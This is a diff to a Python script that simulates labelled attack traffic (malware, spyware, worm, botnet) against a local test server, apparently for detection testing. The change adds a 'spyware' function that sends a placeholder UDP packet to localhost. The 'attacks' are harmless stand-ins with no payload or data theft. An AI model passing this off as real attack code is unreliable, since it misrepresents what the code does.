@@ -5,9 +5,10 @@ Please make sure malicious_server.py is running before running this file!
 We simulate the following attacks: malware, spyware, worm, botnet.
 The immutable fields for the packets also mentioned, any other portion of the packet can be modified without impacting the attack.
 '''
-import socket
+import struct
 import requests
 import sys
+import socket
 from scapy.all import *
 
 '''
@@ -16,12 +17,12 @@ HTTP/HTTPS GET request to a malicious host
 - Must haves: GET request, URL (route)
 - Not important: remaining packet header (e.g. Cache-Control, Connection)
 '''
-def malware(socket):
+def malware(sock):
     url_host = 'www.google.com'
     # ---- Send HTTP request using TCP socket ---- #
     get_req = 'GET / HTTP/1.1\r\nHost: %s\r\n\r\n' % url_host
     print("Sent malware attack: " + get_req)
-    socket.sendall(get_req.encode())
+    sock.sendall(get_req.encode())
 
     # ---- Send HTTP request using request library to see full header ---- #
     r = requests.get('http://' + url_host)
@@ -38,11 +39,26 @@ def malware(socket):
 '''
 (2) Spyware:
 UDP to a malicious server from: compromised IoT device & data sniffed from other devices on the network
-- Must haves: destination IP and port, payload
+- Must haves: destination IP and port (server_addr), payload
 - Not important: remainder of the packet (can add around the payload), header
+
+Code built off of: https://stackoverflow.com/questions/15049143/raw-socket-programming-udp-python
 '''
-def spyware(socket):
-    pass
+def spyware(sock, server_addr):
+    # Not modifiable
+    payload = 'spyware'  # data from sniffed packet
+    dest_port = server_addr[1]
+
+    # Modifiable
+    src_prt = 12346
+    length = 8 + len(payload)
+    checksum = 0
+
+    udp_header = struct.pack('!HHHH', src_prt, dest_port, length, checksum)
+    packet = udp_header + payload.encode()
+    print("Sent spyware attack: ", packet)
+    sock.sendto(udp_header + payload.encode(), server_addr)
+    return
 
 '''
 (3) Worm:
@@ -50,7 +66,7 @@ ICMP neighbor solicitation message with self-propagating worm code ('Hello World
 - Must haves: data field, type = 135
 - Not important: destination, query, length
 '''
-def worm(socket):
+def worm(sock):
     pass
 
 '''
@@ -59,30 +75,26 @@ Domain Name System (DNS) query to C&C [nslookup somesite.com cc_IP]
 - Must haves: destination IP and port
 - Not important: remainder of the query packet
 '''
-def botnet(socket):
+def botnet(sock):
     pass
 
 def main():
-    # ---- TCP Connection with server ---- #
-    port_num = 12346  # hardcoded for simplicity
-    host = 'localhost'
+    server_addr = ('localhost', 12000)  # hardcoded for simplicity
 
-    try:
-        host_ip = socket.gethostbyname(host)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host_ip, port_num))
-    except socket.error as err:
-        print("Socket creation failed with error {0}".format(err))
-        return None
-    except:
-        print("Unexpected error:", sys.exc_info()[0])
-        return None
+    # ---- UDP Connection with server ---- #
+    udp_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-    print("Connected to malicious server at {0}".format(host_ip))
+    # ---- Spyware attack ---- #
+    spyware(udp_s, server_addr)
 
-    # Send attacks to malicious server
-    malware(s)
-    s.close()
+    # # ---- TCP Connection with server ---- #
+    # s.connect(server_addr)
+    #
+    # print("Connected to malicious server at {0}".format(server_addr))
+    #
+    # # ---- Malware attack ---- #
+    # malware(s)
+    # s.close()
 
 if __name__== "__main__":
   main()
